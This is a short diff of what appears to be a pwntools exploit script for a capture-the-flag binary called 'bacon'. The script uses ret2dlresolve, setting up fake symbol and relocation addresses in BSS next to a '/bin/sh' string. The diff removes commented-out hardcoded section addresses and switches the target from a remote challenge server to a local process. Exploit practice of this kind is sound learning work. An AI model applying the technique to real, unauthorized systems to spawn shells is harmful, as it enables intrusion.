@@ -17,11 +17,6 @@ BINSH_STR_ADDR = BSS + 0x20
 FAKE_SYM_ADDR = BSS + 0x100
 FAKE_REL_ADDR = BSS + 0x200
 
-#STRTAB = 0x080482ec
-#SYMTAB = 0x0804820c
-#JMPREL = 0x08048408
-#VERSYM = 0x0804839a
-
 STRTAB, SYMTAB, JMPREL, VERSYM = (e.dynamic_value_by_tag(t) for t in ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL", "DT_VERSYM"])
 
 assert (FAKE_SYM_ADDR - SYMTAB) % 16 == 0 # Alignment sanity check
@@ -57,8 +52,8 @@ def build_elf32_rel():
 
 
 # nc jh2i.com 50032
-p = remote("jh2i.com", 50032)
-#p = process("./bacon")
+#p = remote("jh2i.com", 50032)
+p = process("./bacon")
 
 #gdb.attach(p)
 
